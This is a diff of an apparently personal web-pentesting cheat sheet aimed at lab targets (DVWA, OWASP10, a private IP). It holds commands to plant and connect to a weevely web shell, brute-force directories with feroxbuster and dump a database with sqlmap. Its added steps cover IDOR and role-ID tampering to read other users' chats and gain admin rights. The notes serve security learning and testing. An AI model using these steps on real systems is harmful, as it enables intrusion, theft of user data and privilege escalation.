@@ -81,6 +81,15 @@ weevely generate (any_pass) /storage_path/file_name
 weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 [listen for backdoor connection]
 
+200
+[OK]
+
+300
+[redirect]
+
+400
+[ ]
+
 [+] look for robots.txt files and open -- Information disclosure
 [+] ./feroxbuster -u (web_URL) -w (wordlist)
 - locate url with "cgi-/bin" then load to check for secret key in PHP file
@@ -112,9 +121,11 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 - sqlmap -u "url" -T accounts -D owasp10 --dump   ---open all database file
 - 
 [+] Change admin GET request to true and foward for cookies manipulation -- Broken Access Control
-[+] Copy a user ID to view another users sensitive information/ create 2 accounts
-[+] Test user ID section with "administrator/admin" and view value parameter for hashed password
-[+] 
+- Copy a user ID to view another users sensitive information/ create 2 accounts
+- Test user ID section with "administrator/admin" and view value parameter for hashed password --IDOR leading to BAC
+- Test the live chat section by forwarding txt requests on Burp till theres a get request, change the txt number and see if you can download another user's chat history
+- intercept email update on user profile, forward to repeater, get a RESPONSE to view "role ID", add "," and enter new line in REQUEST then paste "role ID = ", change the ID to number that gives admin privilege --to test if user role can be changed in user profile
+ 
 
 *******************************
 ****INFORMATION GATHERING******
